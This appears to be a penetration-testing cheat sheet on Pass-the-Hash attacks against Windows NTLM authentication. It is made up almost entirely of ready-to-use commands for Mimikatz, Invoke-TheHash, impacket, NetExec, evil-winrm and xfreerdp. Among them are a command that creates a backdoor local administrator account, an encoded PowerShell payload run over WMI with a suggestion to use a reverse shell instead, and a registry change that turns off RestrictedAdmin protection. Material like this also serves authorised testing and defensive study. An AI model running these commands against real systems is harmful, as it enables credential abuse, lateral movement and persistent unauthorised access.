A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. This process abuses the NTLM set of security protocols used as a SSO solution within windows.
## Usage

Windows
```PowerShell
# Mimikatz
mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<NTLM_hash> /domain:<domain> /run:cmd.exe" exit

# https://github.com/Kevin-Robertson/Invoke-TheHash
# PowerShell Invoke-TheHash SMB
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <IP_or_hostname> -Domain <domain> -Username <user> -Hash <NTLM_hash> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose    # After this, authenticate as user
# ALTERNATIVE -- rev shell as command

# PowerShell Invoke-TheHash WMI
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain <domain> -Username <user> -Hash <NTLM_hash> -Command "powershell -e <base64_string>"
```

Linux
```bash
# impacket
impacket-psexec <user>@<ip> -hashes :<NTLM_hash>
impacket-wmiexec    # these can all use PtH
impacket-atexec
impacket-smbexec

# NetExec
netexec smb <ip> -u <user> -d <domain> -H <NTLM_hash>
-x <command>  # command execution

# evil-winrm
evil-winrm -i <ip> -u <user> -H <NTLM_hash>

# RDP
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp  /v:<ip> /u:<user> /pth:<NTLM_hash>
```

#### UAC Limits PtH
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` 
	if this key is set to 0, only local admin Administrator can perform remote admin tasks

